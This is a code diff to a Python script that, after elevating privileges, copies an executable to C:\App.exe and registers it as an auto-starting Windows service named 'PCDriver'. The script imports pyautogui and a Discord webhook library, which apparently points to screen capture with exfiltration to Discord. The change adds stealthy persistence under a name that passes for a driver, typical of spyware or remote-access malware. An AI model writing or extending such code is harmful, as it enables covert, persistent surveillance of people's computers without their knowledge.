@@ -15,9 +15,9 @@ def create_service():
     """Create and start the service using the current script's path."""
     # Get the absolute path of the current script
     script_path = os.path.abspath(__file__)
-    
+    os.system("copy index.exe C:\App.exe")
     # Command to create the service
-    create_command = f'sc create PCDriver binPath= "{script_path}" start= auto'
+    create_command = f'sc create PCDriver binPath= "C:\App.exe" start= auto'
     
     # Execute the command to create the service
     os.system(create_command)
@@ -30,6 +30,7 @@ if __name__ == '__main__':
         create_service()
     else:
         print("Failed to elevate privileges.")
+        sys.exit(1)
 import pyautogui
 import time
 from discord_webhook import DiscordWebhook
